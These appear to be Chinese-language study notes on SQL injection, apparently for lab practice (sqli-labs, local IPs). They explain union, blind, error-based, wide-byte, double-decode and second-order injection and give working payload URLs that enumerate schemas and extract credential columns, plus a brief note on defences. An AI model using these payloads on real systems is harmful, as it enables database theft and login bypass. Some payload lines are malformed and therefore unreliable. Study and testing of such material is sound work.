```
SQL注入原理：
	1、参数用户可控
	2、服务器对参数没有过滤或者过滤不严谨
	
	前端用户输入用来查询数据库的一个sql语句，id=1,服务器需要对该id进行过滤，然后拼接sql语句
	select * from user where id=1;
	id=1 or 1=1
	select * from user where id=1 or 1=1页面会显示正常
	
	select * from user where id='$_POST["id"]';
危害：
	读取数据库的数据
	修改或者删除数据
	往服务器读写文件
	getshell
	
	万能密码原理
	select * from admin where username='user' and password='pass'
	用户名： 1' or 1=1#
	密码：123
	select * from admin where username='1' or 1=1#' and password='123'
	select * from admin where username='1' or 'a'='a'# and password='123'
	
sql注入
	数据提交方式：GET方式，POST方式 Cookie注入 HTTP头注入 
	根据sql注入点的参数类型分类：数字型注入、字符型注入、搜索型注入
	根据反馈类型：报错注入、联合注入、布尔注入、时间注入 堆注入
	根据数据库类型：MSSQL MYSQL ORACLE ACCESS NOSQL LDAP！！！等
	
手工注入
	常用函数：user() version() database() concat() group_concat() concat_ws()
	分割字符串mid()  mysql
			substr()  oracle、mysql、sqlserver
			substring() mysql、sqlserver
			left()  从左截取
			right() 从右截取
	条件判断
    		if(判断的条件，条件为帧返回值，条件为假返回值)
			select if("1=1",'true','false');
			select if(ascii(substr(database(),1,1))>92,"true","false");
			select if(ascii(substr(database(),1,1))=ascii('r'),"true","false");
			   （database(),1,1)   起始位置1，截取长度
				substr 截取字符串
				ascii
			case when 判断条件 then 条件为真返回值 else 条件为假返回值 end
			select case when 1=1 then "right" else "wrong" end;
			select case when ascii(substr(database(),1,1))>92 then "right" else "wrong" 			end;
	数据库注释：#（%23  url编码） -- +（注释掉后面）
	连接符号+
		length(字符串) 计算字符串长度
		select length(user());
	
	
union 联合查询
	select name,pass,gender from users where uid=1 union select 1,2,3//前后字段要求一 致
	可以根据union 判断当前的sql选择的字段数，可以在显错注入中，判断哪个字段在前端显示
	order by n //对第n个字段进行排序,如n超过表的列数，报错。 可以根据order by判断数据库表有几列
	
	mysql 数据库特性
	mysql 5.0上下区别：
		1、5.0以上支持information_schema 
		自带，系统库，汇总（其他数据库名，表名，字段名）存在于information_schema的columns中
		需要关注columns三个字段  table_schema库名 table_name表名 column_name字段名
		select distinct table_schema from information_schema.columns//库名distinct去重
		select distinct table_name from information_schema.columns  //表名
	    select table_name from information_schema.columns where table_schema='x'所有表
		
		select distinct column_name from information_schema.columns where 					table_schema='dvwa' and table_name='user'; 获取dvwa下user表的字段
		注意：可以根据需求将数据库名和表名转换成16进制
		
		手工注入：
			1、判断是否有注入（判断从后台数据库中选取的列数，判断哪几列在前端显示）
			2、收集数据库信息（用户名、版本、当前数据库名）
			3、获取当前数据库下的所有表名
			4、获取当前数据库下指定表中的字段名
			5、获取字段对应的数据
			6、破解数据、登录系统，getshell,提权
	
		案例分析
		1、找url,判断注入点
		url:id=1   inurl:id=
		判断方式
		'  /and sleep(5)   and '1'='1 '1'='2 /' and or 
		根据页面显示效果或者提示信息来判断用户提交的数据是否在数据库中被执行
		2、判断数据库类型
			常见架构
			php+mysql
			jsp/asp+mssql
            jsp/asp+access
            jsp+oracle
		 
		 	函数
		 	http://target.com?id=1 and user>0 (mssql正常执行)
		 	http://target.com?id=2 and version()>0 (mysql正常执行)
		 	
		 	报错信息来判断数据库类型
		 	http://target.com?id=1 and (select count(*) from sysobjects)>0 sqlserver
		 	http://target.com?id=1 and (select count(*) from myobjects)>0  oracle
		 	http://target.com?id=1 and (select count(*) from   			 						information_schema.columns)>0     mysql
		 	
		确定列数和位置	
		 	http://target.com?id=1 order by 10 判断列数
		 	http://target.com?id=1 union select 1,2,3,4,5 
		 	如果不回显，让第一个select变为假 如id=-1   !!!!!!
		 	http://target.com?id=-1 union select 1,2,3,4,5  
		 	
		收集信息
			所有数据库
			http://192.168.91.131/jdy/typeid.php?typeid=-1 union select 1,(select group_concat(distinct table_schema) from information_schema.columns),3,4,5
			
			group_concat将多个字符串合并成一个字符串		
			
			当前数据库
			http://target.com?id=-1 union select 1,(database()),3,4,5
			数据库版本
			http://target.com?id=-1 union select 1,(version()),3,4,5
			用户
			http://target.com?id=-1 union select 1,user(),3,4,5
			临时文件夹
			http://target.com?id=-1 union select 1,(@@tmpdir),3,4,5
			数据库文件所在位置
			http://target.com?id=-1 union select 1,(@@datadir),3,4,5
		 	
		获取当前数据库下表名 	
		 	http://target.com?id=-1 union select 1,(select group_concat(distinct 				table_name) from information_schema.tables where 									table_schema=database()),3,4,5
		 	
		 	http://target.com?id=-1 union select 1,(select group_concat(distinct 				table_name) from information_schema.columns where table_schema=十六进制的数据			  库名 0x开头)),3,4,5
		 	
		获取当前数据库下指定表字段			 	
		 	http://target.com?id=-1 union 1,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name=十六进制的表名 0x开头)3,4,5		 	
		 	
		 获取字段的数据
         http://target.com?id=-1 union select 1,(select concat_ws(列1，列2) from 表名 limit 0,1)3,4,5 
		 
		 concat_ws   参数之间的分隔符 由于返回是多个值，所以需要进行limit
		 	
		 
盲注：
	定义：用户提交的数据在后台数据库中执行，没有任何的数据（报错信息，执行sql语句的数据）传到前端 
	可以使用基于布尔的盲注、基于时间的盲注 利用这些方法，结合浏览器的效果，判断payload的正确性
	使用bool  判断页面是否正常
	使用time  页面加载时间
	数据库函数
		length() 长度
		ascii() 返回字符ascii值
		if()
		mid
		substr()
		substring()
	基于布尔的盲注探测
    	1、探测注入点  ' / 1' and 1=1 # /1 ' and '1'='1'#
		用户提交的数据被带入到后台数据库中执行，根据页面效果判断此处是否有注入点
		2、收集信息
		http://target.com?id=1' and length(user<10)%23  //假设用户民长度10
		http://target.com?id=1' and ascii(substr(user(),1,1))<120%23 第一位
		http://target.com?id=1' and ascii(substr(user(),2,1))<120%23 第二位
		用工具burp suite爆破  可以sniper 也可以cluster  boomper
		3、查询当前数据库中的表
		http://target.com?id=1' and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=120%23 
		4、获取字段名   '表名' 有可能被代码注释掉，所以选用0x开头的16进制
		http://target.com?id=1' and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1),1,1))=120%23 
		5、获取字段数据
		http://target.com?id=1' and ascii(substr((select concat(username,0x3a,password) from users limit 0,1),1,1))=120%23 
		
		
报错注入
	之所以能报错，是因为有回显
	报错函数：
		1、extractvalue(参数1，参数2)
		从目标XML中返回查询的字符串，参数1是string,XML文档名，参数2是Xpath格式，要查询的字符串
		select extractvalue(1,concat(0x7e,(select user()),0x7e));
		2、updatexml(参数1、参数2、参能3)
		改变文档中符合条件的节点的值，参数1是xml文档，参数2
		是xpath的字符串，参数3是string 格式替换查找符合如条件的数据
		select updatexml(1,concat(0x7e,(version()),0x7e),1);
		
		前两个报错的长度有限制32位。
		3、floor()函数 ，必须是和count() rand() group by配合报错
		select * from news where tid=1 and select 1 from (select count(*),)
		
		SELECT count(*),concat(FLOOR(rand(0)*2),(SELECT database()))x from 					information_schema.tables GROUP BY x
			
	7种报错函数
   （1）geometrycollection（）
	select * from news where tid=1 and geometrycollection((select * from (select * from 	(select user())a)b));
	
	(2)multipoint()函数
	select * from test where id=1 and multipoint((select * from(select * from(select 	 user())a)b));


	(3)polygon()函数
	select * from test where id=1 and polygon((select * from(select * from(select 		user())a)b));


	(4)multipolygon()函数
	select * from test where id=1 and multipolygon((select * from(select * from(select 	   user())a)b));


	(5)linestring()函数
	select * from test where id=1 and linestring((select * from(select * from(select 	user())a)b));


	(6)multilinestring()函数
	select * from test where id=1 and multilinestring((select * from(select * 			from(select user())a)b));


	(7)exp()函数
	select * from test where id=1 and exp(~(select * from(select user())a));

实验演示
select extractvalue(1,concat(0x7e,(select user()),0x7e));
1、
2、
http://192.168.91.148/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select user()),0x7e))%23;

http://192.168.91.148/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.columns where table_schema=database() limit 0,1),0x7e)) --+
		
基于时间的盲注
	函数：
		sleep()  benchmark()要与条件类函数配置使用
		sleep(参数)  参数直接写以秒为单位的时间数字  sleep(5)
		select * from users where id=1 and select if(1=1,sleep(5),'bye')
		
		benchmark(参数1，参数2)  参数1：表示执行某项操作的次数   参数2：某项操作
		select if(length(user())>4,benchmark(500000,md5('abc')),'bye')
		


伪静态注入
	http://www.xxx.com/index.asp?id=1
	http://www.xxx.com/1.html
		
	1、开启站点重写机制		
	2、接下来新建 .htaccess文件	 	
	3、支持解析httpd.conf
    	AllowOverride All
	4、	 	
		 	
宽字节注入		 	
	常见转义函数
	原因：数据库采用gbk编码，对用户输入的数据进行转义。形成宽字节注入
	gbk编码：GB2312的一个扩展		 
    addslaches()
    mysql_real_escape_string()
    mysql_escape_string()   php 5.3以后移除
    魔术引号GPC  magic_quotes_gpc
		 	
	对特殊字符进行转义    	' " \ NULL 等转义	 \' \"\ \ \	 	
	mysql_real_escape_string() 不会对 % _ 进行转义
    http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df'
    http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df\'
	http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df%5c'  //  \的url编码为%5c      	 //df5c构成一个汉字	
	http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df%5c'	 	
	http://192.168.91.148/kuanzijie/data sql/0x01/?id=1%df' order by 3%23	 	
	http://192.168.91.148/kuanzijie/data sql/0x01/?id=0%df' union select 1,2,3%23
	
	http://192.168.91.148/kuanzijie/data sql/0x01/?id=0%df' union select 				1,group_concat(column_name),3 from information_schema.columns where          		table_schema=database() and table_name =0x61646d696e%23   //table 16进制编码 以0x开头

	http://192.168.91.148/kuanzijie/data sql/0x01/?id=0%df' union select   				1,group_concat(name,pass),3 from admin%23	
	
二次解码注入
	过滤函数（转义函数）
	addslaches()
    mysql_real_escape_string()
    mysql_escape_string()   php 5.3以后移除
	
	urldecode()  url解码
	浏览器出去的数据被进行url编码，到达服务器后，默认会被url解码
	
	http://192.168.91.148/Secondary_code_injection/urldecode.php?id=1%2527
	http://192.168.91.148/Secondary_code_injection/urldecode.php?id=1%2527 order by 3%23
	http://192.168.91.148/Secondary_code_injection/urldecode.php?id=0%2527 union select 1,2,3%23
	
PDO宽字节	
	1、数据库使用GBK编码
	2、使用转义函数，如addslaches()
	3、PHP版本<5，3，6，
	使用PDO连接数据库，设置GBK，没有参数过滤
	http://192.168.91.151/PDOkuanzijie/PDO_kuanjiezi.php?id=1%df' order by 8%23
	
	http://192.168.91.151/PDOkuanzijie/PDO_kuanjiezi.php?id=1%df' union select 			1,2,3,4,5,6,7,8%23
	
	防御方法：
	1、mysql_set_charset("gbk") 通过这种方式去设置gbk
	2、使用mysql_real_escape_string()转义参数，不会出现拼接。
	最好同时使用
时间盲注
	substr(string,start,length)
	if表达式：if(条件,结果1,结果2)  //如果条件为真，执行结果1。如果为假，执行结果2
	http://10.0.0.21/yanci.php?id=1' and sleep(5)%23
	
	http://10.0.0.21/yanci.php?id=1' and 										if(ascii(substr(database(),1,1))=114,1,sleep(5))#
cookie注入:
XFF(x forwarded for)注入：
     x-forwarded for:
	
二次注入	
	是指已存储的数据（脏数据）在被读取后，再次进入到SQL查询语句中导致的注入
	二次注入原理：
	第一次进行插入数据时候，仅仅使用addslashes()或者魔术引号GPC，对其宏的特殊数据进行转义。
	在存入的数据仍然保留原来的格式，但是本身还是脏数据
	待数据从数据库取出后，与此次代码进行拼凑，就会造成SQL二次注入
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
```

